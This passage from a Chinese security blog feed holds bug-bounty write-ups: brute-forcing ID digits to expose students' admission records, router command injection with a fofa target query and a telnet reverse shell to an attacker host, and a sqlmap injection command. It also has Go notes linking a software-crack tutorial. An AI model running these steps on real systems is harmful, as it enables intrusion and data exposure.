    <content type="html"><![CDATA[<p>一次有意思的教育SRC逻辑漏洞</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次挖到一个有意思的逻辑漏洞👍</p><p>在挖掘教育SRC时，我们可以关注到一个必然存在交互的地方，那就是录取查询，这里必然是有一个查询框，所以可以测一测</p><h3 id="某职业学院的录取查询页面"><a href="#某职业学院的录取查询页面" class="headerlink" title="某职业学院的录取查询页面"></a>某职业学院的录取查询页面</h3><p><a href="http://xxx.xxx.edu.cn/lqcx.htm">http://xxx.xxx.edu.cn/lqcx.htm</a></p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-41-26.png"></p><p>可以发现这里的查询很简单，只要输入身份证的后8位即可查询到录取信息，所以这里我们不妨抓个包试试，发现是明文传输数据，好家伙，这里可以打打SQL注入，打了，没有哈哈</p><h3 id="存在逻辑缺陷"><a href="#存在逻辑缺陷" class="headerlink" title="存在逻辑缺陷"></a>存在逻辑缺陷</h3><p>点击查询后抓包，修改参数<code>sfh8w</code>，试一试是不是可以获取别人的信息</p><p>那我改一下身份证后4位然后爆破，然后，居然真有，还这么多</p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-46-05.png"></p><p>输一个查询试试，可以发现虽然中间8位打了马，但是查询的时候用了后8位，相当于只打了4位的马，然后呢，身份证嘛，那打码的4位，猜都猜得到，2004-2006，试试就行了</p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-44-30.png"></p><p>然后，这里也不能叫越权吧，应该算是设计上的逻辑缺陷，只凭身份证后8位就可以查询信息了哈哈</p><p>交了，妥妥一个中危👍👍</p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-52-30.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次路由器Getshell-230829</title>
    <link href="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/"/>
    <url>/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/</url>
    
    <content type="html"><![CDATA[<p><code>Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞实战复现</code></p><p>一次路由器Getshell</p><span id="more"></span><h3 id="访问到路由器web页面"><a href="#访问到路由器web页面" class="headerlink" title="访问到路由器web页面"></a>访问到路由器web页面</h3><p>fofa搜索:<code>title=&quot;index&quot; &amp;&amp; header=&quot;lighttpd/1.4.30&quot;</code>，<code>lighttpd</code>是一个轻量级的服务器中间件</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/1.png"></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/3.png"></p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>发现<code>cgi-bin</code>页面，引发命令注入，这里发现不需要注入，直接执行了命令</p><p><code>https://x.x.x.x:8090/cgi-bin/popen.cgi?command=ls&amp;v=0.1303033443137912</code></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/2.png"></p><p>获取信息：</p><p><code>/cgi-bin/popen.cgi?command=uname -a&amp;v=0.1303033443137912</code>，发现一个<code>MIPS</code>的<code>Linux</code>系统，显然的嵌入式设备了</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/5.png"></p><p><code>/cgi-bin/popen.cgi?command=ls /www&amp;v=0.1303033443137912</code>，发现这个<code>web</code>应用居然是用纯<code>html+js</code>写的，无语了🤣，后续<code>Getshell</code>有点麻烦了</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/6.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>既然可以命令注入，那么首先就是想到反弹shell，这里笔者走了许多弯路</p><h4 id="尝试nc反弹shell"><a href="#尝试nc反弹shell" class="headerlink" title="尝试nc反弹shell"></a>尝试nc反弹shell</h4><p>执行命令<code>/cgi-bin/popen.cgi?command=nc&amp;v=0.1303033443137912</code></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/4.png"></p><p>发现出现了<code>BusyBox</code>字样，笔者此时对其不太了解，先学习一下：</p><p><a href="https://zh.wikipedia.org/zh-hans/BusyBox">BusyBox-wiki</a></p><p>原来是是嵌入式里的命令行系统软件，相当于一个精简版的<code>Linux shell</code>，其中的<code>nc</code>命令都是被阉割的，于是首先想到能否弄一个完整版的的<code>nc</code>，于是测试是否有<code>yum</code>、<code>apt</code>命令，和想的差不多，没有哈哈😒，只有一个<code>wget</code>命令，那么能不能<code>wget</code>一个<code>nc</code>，然后自己编译呢，于是试试，</p><p><code>/cgi-bin/popen.cgi?command=wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz</code></p><p>结果不支持，真无语，以前没搞过嵌入式设备，无奈放弃🤣</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/7.png"></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/8.png"></p><h4 id="柳暗花明-telnet反弹Shell"><a href="#柳暗花明-telnet反弹Shell" class="headerlink" title="柳暗花明-telnet反弹Shell"></a>柳暗花明-telnet反弹Shell</h4><p>在查阅路由器如何反弹shell时，无意间看到了这样一句话</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/9.png"></p><p>好家伙，直接开冲啊，弹弹弹！</p><ol><li><p>开启telnet：<code>/cgi-bin/popen.cgi?command=telnetd&amp;v=0.1303033443137912</code></p></li><li><p>攻击机上启监听：<code>nc -lvvp </code></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/10.png"></p></li><li><p>弹shell：分两次执行</p><p><code>mknod a p</code></p><p><code>telnet x.x.x.x 5555 0&lt;a | /bin/bash 1&gt;a (x.x.x.x为攻击机ip)</code></p></li></ol><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/11.png"></p><p>监听到了，反弹成功！</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/12.png"></p><p>第一次拿到路由器系统的说，哈哈恶趣味一把😘</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/13.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>路由器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次公益src挖掘-230820</title>
    <link href="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/"/>
    <url>/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/</url>
    
    <content type="html"><![CDATA[<p>幸运儿之登陆框发现SQL注入哈哈🤣😂</p><span id="more"></span><h3 id="Google语法找目标"><a href="#Google语法找目标" class="headerlink" title="Google语法找目标"></a>Google语法找目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br></code></pre></td></tr></table></figure><h3 id="发现登录页面"><a href="#发现登录页面" class="headerlink" title="发现登录页面"></a>发现登录页面</h3><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-16-54.png"></p><p>抓包，</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-22-15.png"></p><p>首先测试弱口令爆破，</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-18-37.png"></p><p>还以为有希望，结果不是🤣</p><h3 id="发现存在SQL注入"><a href="#发现存在SQL注入" class="headerlink" title="发现存在SQL注入"></a>发现存在SQL注入</h3><p>传统艺能之跑<code>sqlmap</code>，保存请求包到txt文件，使用命令：<code>python sqlmap.py -r &quot;./test.txt&quot; --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --dbs</code>，欸嘿，还真跑出来了😎</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-23-17.png"></p><p>跑个数据名和表名作为证据：</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-25-55.png"></p><p>点到为止就可以提交到平台啦！</p><p>一个妥妥的高危，俺也是幸运儿啦！😊😊</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-31_23-04-41.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GO学习笔记_1</title>
    <link href="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
    <url>/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>跟着《GO圣经》学习GO啦！</p><span id="more"></span><h3 id="Go的优势"><a href="#Go的优势" class="headerlink" title="Go的优势"></a>Go的优势</h3><ul><li><p>简单易学</p></li><li><ul><li>Go语言的作者都有C的基因，Go自然而然也有了C的基因，但是Go的语法比C还简单, 并且几乎支持大多数你在其他语言见过的特性：封装、继承、多态、反射等</li></ul></li><li><p>丰富的标准库</p></li><li><ul><li>Go目前已经内置了大量的库，特别是网络库非常强大</li><li>前面说了作者是C的作者，所以Go里面也可以直接包含c代码，利用现有的丰富的C库</li></ul></li><li><p>跨平台编译和部署</p></li><li><ul><li>Go代码可直接编译成机器码，不依赖其他库，部署就是扔一个文件上去就完事了. 并且Go代码还可以做到跨平台编译(例如: window系统编译linux的应用)</li></ul></li><li><p>内置强大的工具</p></li><li><ul><li>Go语言里面内置了很多工具链，最好的应该是gofmt工具，自动化格式化代码，能够让团队review变得如此的简单，代码格式一模一样，想不一样都很困难</li></ul></li><li><p>性能优势: Go 极其地快。其性能与 C 或 C++相似。在我们的使用中，Go 一般比 Python 要快 30 倍左右</p></li><li><ul><li>语言层面支持并发，这个就是Go最大的特色，天生的支持并发，可以充分的利用多核，很容易的使用并发</li><li>内置runtime，支持垃圾回收</li></ul></li></ul><h3 id="Go环境搭建"><a href="#Go环境搭建" class="headerlink" title="Go环境搭建"></a>Go环境搭建</h3><h4 id="Goland下载安装"><a href="#Goland下载安装" class="headerlink" title="Goland下载安装"></a>Goland下载安装</h4><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-15_19-49-47.png"></p><p><a href="https://www.jetbrains.com/go/download/other.html">Goland各版本下载</a></p><p><a href="https://chenjunan.top/detail/Detail?id=37">Goland破解教程</a></p><h4 id="Go语言安装"><a href="#Go语言安装" class="headerlink" title="Go语言安装"></a>Go语言安装</h4><p><a href="https://go.dev/dl/">官网地址</a></p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-15_19-51-26.png"></p><p><code>go version</code>查看是否安装完成</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-15_19-55-52.png"></p><h3 id="开始GO-——Part1"><a href="#开始GO-——Part1" class="headerlink" title="开始GO!——Part1"></a>开始GO!——Part1</h3><p>笔者跟着《Go语言圣经》一起学习的~~😘</p><p>对应第一章</p><h4 id="编写第一个GO程序"><a href="#编写第一个GO程序" class="headerlink" title="编写第一个GO程序"></a>编写第一个GO程序</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 通过循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, b)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在命令行里执行<code>go run .\Hello.go http://gopl.io</code>，得到返回包，说明你的Go语言环境已经完全搭建成功啦！</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_12-43-23.png"></p><h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><code>os</code>包提供一些与操作系统交互的函数和变量，程序的命令行参数可以从<code>os</code>包的Args变量获取。</p><p><code>os.Args</code>变量是一个字符串的切片，区间索引时，同样是<strong>左闭右开</strong></p><p><code>os.Args</code>的第一个元素，<code>os.Args[0]</code>, 是命令本身的名字；其它的元素则是程序启动时传给它的 参数。s[m:n]形式的切片表达式，产生从第m个元素到第n-1个元素的切片。如果省略切片表达式的m或n，会默认传入0或 len(s)，因此切片可以简写成os.Args[1:]。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-comment">//测试程序</span><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>   <span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br>   <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ &#123;<br>      s += sep + os.Args[i]<br>      sep = <span class="hljs-string">&quot; &quot;</span><br>   &#125;<br>   fmt.Println(s)<br>&#125;<br></code></pre></td></tr></table></figure><p>对于上面的程序，我们可以有如下理解：</p><ul><li><p>GO里面注释使用<code>//</code></p></li><li><p>GO初始定义的变量若是没有赋值，则隐式地被赋为零值，数值类型是0，字符串类型是空字符串””</p></li><li><p>对于string类型的变量，<code>+</code>号可以直接连接字符串</p></li><li><p>循环变量<code>i</code>没有定义类型，是因为。<strong>符号<code>:=</code> 是短变量声明的一部分</strong>, 这是定义一个或多个变量并根据它们的初始值为这些变量赋予适当类型的语句</p></li><li><p>GO中<code>i++</code>是语句，不是表达式，所以不能用于赋值，**<code>j=i++</code>非法<strong>，而且<code>++</code>和<code>--</code>都只 能放在变量名后面，因此</strong><code>--i </code>也非法**</p></li><li><p>GO中只有<code>for</code>一种循环语句，但有多种形式</p><ul><li><p>第一种：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> initialization; condition; post&#123;<br>    <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for 循环三个部分不需要括号包围，左大括号必须与post同一行</span><br><span class="hljs-comment">initalization如果存在，必须是一条简单语句。即，短变量声明、自增语句、赋值语句或函数调用。</span><br><span class="hljs-comment">condition 是一个布尔表达式（boolean expression），其值在每次循环迭代开始时计算。如果为 true 则执行循环体语句。</span><br><span class="hljs-comment">post语句在循环体执行结束后执行，之后再次对conditon求值。condition 值为 false 时，循环结束</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><p>省略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// a traditional &quot;while&quot; loop</span><br><span class="hljs-keyword">for</span> condition &#123;<br><br>&#125;<br><span class="hljs-comment">//上面就是省略了初始化和post，变成了熟悉的while循环</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>range</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>s += sep + arg<br>sep = <span class="hljs-string">&quot; &quot;</span><br>&#125;<br><span class="hljs-comment">/*for 循环的另一种形式, 在某种数据类型的区间（range）上遍历，如字符串或切片。</span><br><span class="hljs-comment">大多数程序员都这么写for循环</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>每次循环迭代，range产生一对值：索引以及索引对应的元素值<br>但是我们这个例子不需要索引，而<strong>range的语法要求：要处理元素，必须处理索引</strong><br>而且<strong>GO不允许使用无用的局部变量，会编译错误</strong><br>解决方法是使用空标识符<code>_</code>，<strong>空标识符可用于任何语法需要变量名但程序逻辑不需要的时候</strong></p></li></ul></li><li><p>声明一个变量有好几种方式，下面这些都等价：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>一个简洁的写法，使用strings包的Join函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:],<span class="hljs-string">&quot;&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="练习-1-1"><a href="#练习-1-1" class="headerlink" title="练习 1.1"></a>练习 1.1</h5><p>修改 echo 程序，使其能够打印 os.Args[0] ，即被执行命令本身的名字。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ &#123;<br>s += sep + os.Args[i]<br>sep = <span class="hljs-string">&quot; &quot;</span><br>&#125;<br>fmt.Println(s)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_13-47-33.png"></p><h5 id="练习-1-2"><a href="#练习-1-2" class="headerlink" title="练习 1.2"></a>练习 1.2</h5><p>修改 echo 程序，使其打印每个参数的索引和值，每个一行。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> n, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d %s\n&quot;</span>, n, arg)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_13-51-04.png"></p><h5 id="练习-1-3"><a href="#练习-1-3" class="headerlink" title="练习 1.3"></a>练习 1.3</h5><p>做实验测量潜在低效的版本和使用了 strings.Join 的版本的运行时间差异。（1.6 节讲解了部分 time 包，11.4节展示了如何写标准测试程序，以得到系统性的性能评测。）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   start := time.Now()<br>   <span class="hljs-comment">//测试一</span><br>   <span class="hljs-comment">//for _, arg := range os.Args[1:] &#123;</span><br>   <span class="hljs-comment">// fmt.Printf(&quot;%s &quot;, arg)</span><br>   <span class="hljs-comment">//&#125;</span><br>   <span class="hljs-comment">//测试二</span><br>   fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>))<br>   secs := time.Since(start).Seconds()<br>   fmt.Printf(<span class="hljs-string">&quot;花费：%.8fs&quot;</span>, secs)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_14-02-15.png"></p><p>使用<code>Join</code>函数确实可以大幅减少时间复杂度</p><h4 id="查找重复的行"><a href="#查找重复的行" class="headerlink" title="查找重复的行"></a>查找重复的行</h4><p>对文件做拷贝、打印、搜索、排序、统计或类似事情的程序都有一个差不多的程序结构：一 个处理输入的循环，在每个元素上执行计算处理，在处理的同时或最后产生输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 创建一个用于从标准输入读取的扫描器</span><br>input := bufio.NewScanner(os.Stdin)<br><span class="hljs-comment">// 循环读取标准输入的每一行文本</span><br><span class="hljs-keyword">for</span> input.Scan() &#123;<br><span class="hljs-comment">// 将当前行文本作为键，增加其对应的出现次数</span><br>counts[input.Text()]++<br>&#125;<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts &#123;<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d\t%s\n&quot;</span>, n, line)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_15-05-52.png"></p><p>对上面的代码可以有如下理解：</p><ul><li><p><code>map</code>是存储了键值对的集合，键可以是任意类型，只要其值可以用<code>==</code>运算符比较；值可以是任意类型。上面得的代码中，键是字符串，值是整数。内置函数make创建空函数</p></li><li><p>打印结果使用<code>range</code>函数，在<code>counts</code>上迭代，每次得到键和值。需要注意的是，**<code>map</code>的遍历顺序不确定，该顺序随机，每次运行都会变化**。</p></li><li><p>关于<code>bufio</code>包，这个包使得处理输入和输出方便高效。<code>Scanner</code>类型是该包最有用的特性之 一，它读取输入并将其拆成行或单词；<strong>通常是处理行形式的输入最简单的方法</strong>。 程序使用短变量声明创建<code>bufio.Scanner</code>类型的变量<code>input</code>。读取内容由<code>input.Text()</code>获取，在读到一行时返回<code>true</code>。</p></li><li><p><code>fmt.Printf</code>函数对一些表达式产生格式化输出。该函 数的首个参数是个格式字符串，指定后续参数被如何格式化。和C语言类似。后缀<code>f</code>指<code>fomart</code>，<code>ln</code> 指<code>line</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">%d 十进制整数<br>%x, %o, %b 十六进制，八进制，二进制整数。<br>%f, %g, %e 浮点数： <span class="hljs-number">3.141593</span> <span class="hljs-number">3.141592653589793</span> <span class="hljs-number">3.141593e+00</span><br>%t 布尔：<span 